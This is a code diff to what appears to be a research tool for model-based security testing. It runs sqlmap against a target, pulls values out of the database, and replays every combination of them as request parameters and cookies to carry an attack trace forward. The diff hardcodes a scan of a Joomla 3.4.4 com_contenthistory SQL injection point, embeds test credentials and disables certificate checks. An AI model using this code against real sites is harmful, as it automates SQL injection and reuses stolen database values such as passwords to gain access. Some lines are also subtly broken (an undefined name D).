@@ -145,38 +145,104 @@ def execute_attack(msc_table,extension_sqli,file_aslanpp):
                     else:
                         param_pair.append(tmp[0] + "=" + tmp[1])
                         req_params.append(param_pair)
+
+                # generate all possible combination of headers to try
+                cookies = {}
+                req_headers = []
+                for k,v in concretization_data[tag]["headers"].items():
+                    tmp = v.split("=")
+                    headers_pair = []
+                    if tmp[1] == "?":
+                       # we need to provide something from the output of sqlmap
+                       table = concretization_data[tag]["tables"][tmp[0]].split(".")
+                       for v in sqlmap_output[table[0]][table[1]]:
+                           headers_pair.append(tmp[0]+"="+v)
+                       cprint(headers_pair,"D")
+                       req_headers.append(headers_pair)
+                       cprint(req_headers,"D")
+                    else:
+                        headers_pair.append(tmp[0] + "=" + tmp[1])
+                        req_headers.append(headers_pair)
+
                 cprint(req,"D")
-                params_perm = None
-                # I used the %26 because it might happen that the password has a &
-                params_perm = ["%26".join(str(y) for y in x) for x in itertools.product(*req_params)]
+                # I used the %26 (encode of &) because it might happen that the password has a &
+                # and when I split, I split wrong
+                params_perm = []
+                headers_perm = []
+                if len(req_params) > 0:
+                    params_perm = ["%26".join(str(y) for y in x) for x in itertools.product(*req_params)]
+                if len(req_headers) > 0:
+                    headers_perm = ["%26".join(str(y) for y in x) for x in itertools.product(*req_headers)]
+                cprint("params perm","D")
                 cprint(params_perm,"D")
-                # loop on all the possibile params combination and try to exploit the result
+                cprint("headers perm","D")
+                cprint(headers_perm,"D")
+
                 found = False
-                for param in params_perm:
-                   if not found:
-                       cprint("attempt to exploit sqli results","D")
-                       cprint(param,"D")
-                       # I used the %26 because it might happen that the password has a &
-                       req["params"] = dict( item.split("=") for item in param.split("%26") )
-                       cprint(req,"D")
-                       response = __execute_request(req)
-                       # check if reponse is valid based on the MSC
-                       # pages contain the right side of a response
-                       pages = msc_table[idx+1][1][2].split(".")
-                       for p in pages:
-                               cprint(concretization_data[p],"D")
-                               try:
-                                       if response != None and concretization_data[p] in response.text:
-                                           cprint("valid request","D")
-                                           cprint(concretization_data[p],"D")
-                                           found = True
-                                           break;
-                               except Exception:
-                                       cprint("NO ","D")
+                # loop on all the possibile params and headers combination and try to exploit the result
+                if len(params_perm) == 0 and len(headers_perm) > 0:
+                    # we only have headers
+                    for header in headers_perm:
+                        if not found:
+                            cprint("Attempt to exploit sqli","D")
+                            cprint(header,"D")
+                            req["headers"] = dict( item.split("=") for item in header.split("%26") )
+                            response = __execute_request(req)
+                            found = __check_response(idx,msc_table,concretization_data,response)
+
+                if len(params_perm) > 0 and len(headers_perm) == 0:
+                    # we only have params
+                    for param in params_perm:
+                        if not found:
+                            cprint("Attempt to exploit sqli","D")
+                            cprint(param,D)
+                            req["params"] = dict( item.split("=") for item in param.split("%26") )
+                            response = __execute_request(req)
+                            found = __check_response(idx,msc_table,concretization_data,response)
+
+                if len(params_perm) > 0 and len(headers_perm) > 0:
+                    # we have params and headers values
+                    for param in params_perm:
+                        req["params"] = dict( item.split("=") for item in param.split("%26") )
+                        for header in headers_perm:
+                            if not found:
+                                cprint("Attempt to exploit sqli","D")
+                                cprint(param,D)
+                                req["headers"] = dict( item.split("=") for item in header.split("%26") )
+                                response = __execute_request(req)
+                                found = __check_response(idx,msc_table,concretization_data,response)
+                
+
+                #found = False
+                #for param in params_perm:
+                #    for cookie in headers_perm:
+                #        if not found:
+                #            cprint("attempt to exploit sqli results","D")
+                #            cprint(param,"D")
+                #            # I used the %26 (encode of &) because it might happen that the password has a &
+                #            # and when I split, I split wrong
+                #            
+                #            req["params"] = dict( item.split("=") for item in param.split("%26") )
+                #            req["headers"] = dict( item.split("=") for item in cookie.split("%26") )
+                #            cprint(req,"D")
+                #            response = __execute_request(req)
+                #            # check if reponse is valid based on the MSC
+                #            # pages contain the right side of a response
+                #            pages = msc_table[idx+1][1][2].split(".")
+                #            for p in pages:
+                #                   cprint(concretization_data[p],"D")
+                #                   try:
+                #                           if response != None and concretization_data[p] in response.text:
+                #                               cprint("valid request","D")
+                #                               cprint(concretization_data[p],"D")
+                #                               found = True
+                #                               break;
+                #                   except Exception:
+                #                           cprint("NO ","D")
                 if not found:
-                     # we coulan'td procede in the trace, abort
-                     cprint("Exploitation failed, abort trace execution",color="r")
-                     exit(0)
+                    # we coulan'td procede in the trace, abort
+                    cprint("Exploitation failed, abort trace execution",color="r")
+                    exit(0)
                 else:
                     cprint("Exploitation succceded",color="g")
 
@@ -208,7 +274,20 @@ def execute_attack(msc_table,extension_sqli,file_aslanpp):
                            cprint("Step succceded",color="g")
     cprint("Trace ended",color="g")
                              
-
+def __check_response(idx,msc_table,concretization_data,response):
+    pages = msc_table[idx+1][1][2].split(".")
+    for p in pages:
+           cprint(concretization_data[p],"D")
+           try:
+                   if response != None and concretization_data[p] in response.text:
+                       cprint("valid request","D")
+                       cprint(concretization_data[p],"D")
+                       return True
+                       break;
+           except Exception:
+                    return False
+                    cprint("NO ","D")
+    return False
 
 # parameters for configuring the requests maker:
 # Requests group
@@ -222,27 +301,35 @@ def __execute_request(request):
     global s
     url = request["url"]
     method = request["method"]
-    params = request["params"]
+    try:
+        params = request["params"]
+    except KeyError:
+        params = []
+    try:
+        headers = request["headers"]
+    except KeyError:
+        headers = []
 
     cprint("Execute request")
     cprint(url)
     cprint(method)
     cprint(params)
+    cprint(headers)
     #url = 'https://157.27.244.25/chained'
-    headers = {'user-agent': 'my-app/0.0.1'}
+    headers2 = {'user-agent': 'my-app/0.0.1'}
     if global_var.proxy != None:
         proxies = {"http" : "http://"+global_var.proxy,"https":"https://"+global_var.proxy}
     r = None
     if method == "GET":
         if global_var.proxy != None:
-            r = s.get(url,proxies=proxies,params=params, verify=False, auth=('regis','password'))
+            r = s.get(url,proxies=proxies,params=params, cookies=headers, verify=False, auth=('regis','password'))
         else:
-            r = s.get(url,params=params, verify=False, auth=('regis','password'))
+            r = s.get(url,params=params, verify=False, cookies=headers,auth=('regis','password'))
     else:
         if global_var.proxy != None:
-            r = s.post(url,proxies=proxies, data = params, verify=False, auth=('regis','password'))
+            r = s.post(url,proxies=proxies, data = params, cookies=headers,verify=False, auth=('regis','password'))
         else:
-            r = s.post(url, data = params, verify=False, auth=('regis','password'))
+            r = s.post(url, data = params, verify=False, cookies=headers,auth=('regis','password'))
 
     #r = requests.get(url, headers=headers, proxies=proxy, verify=False, auth=('regis','password'))
     cprint(r.text,"D")
@@ -282,12 +369,15 @@ def __execute_sqlmap(sqlmap_details):
     task = wrapper.sqlmap.new_task()
     wrapper.sqlmap.set_option("authType","Basic",task)
     wrapper.sqlmap.set_option("authCred","regis:password",task)
+    wrapper.sqlmap.set_option("dropSetCookie","false",task)
 
     url_params = ""
     for k,v in params.items():
-        url_params = url_params+"&"+k+"="+v
+        url_params = url_params+k+"="+v+"&"
+    url_params = url_params[:-1]
     if method == "GET":
-        wrapper.sqlmap.set_option("url",url+"/"+url_params,task)
+        url = url+"?"+url_params
+        wrapper.sqlmap.set_option("url",url,task)
     elif method == "POST":
         wrapper.sqlmap.set_option("url",url,task)
         wrapper.sqlmap.set_option("data",url_params,task)
@@ -301,7 +391,8 @@ def __execute_sqlmap(sqlmap_details):
     #wrapper.sqlmap.set_option("data","username=?&password=?",task)
     #wrapper.sqlmap.set_option("tbl","users",task)
 
-    wrapper.sqlmap.start_scan(url,task)
+    wrapper.sqlmap.start_scan("https://157.27.244.25/joomla3.4.4/index.php?list[select]=?&option=com_contenthistory&view=history",task)
+    #wrapper.sqlmap.start_scan(url,task)
     cprint(url,"D")
     cprint(method,"D")
     cprint(params,"D")
@@ -312,11 +403,12 @@ def __execute_sqlmap(sqlmap_details):
     while not stopFlag.wait(5):
         r = wrapper.sqlmap.get_status(task)
         if "terminated" in r:
-            cprint("Analysis terminated","D")
+            cprint("Analysis terminated","V")
             sqlmap_output = wrapper.sqlmap.get_data(task)
             stopFlag.set()
         else:
-            cprint("Analysis in progress ... ","D")
+            cprint("Analysis in progress ... ","V")
+            cprint(wrapper.sqlmap.get_log(task),"D")
     
     # Let's parse the data extracted
     cprint(sqlmap_output,"D")
@@ -333,6 +425,7 @@ def __execute_sqlmap(sqlmap_details):
         try:
             extracted_values[tmp_table][tmp_column] = sqlmap_output["data"][2]["value"][tmp_column]["values"]
         except Exception:
+            cprint(wrapper.sqlmap.get_log(task),"V")
             cprint("error in the sqlmap output","E")
             wrapper.sqlmap.kill
             cprint(sqlmap_output,"D")
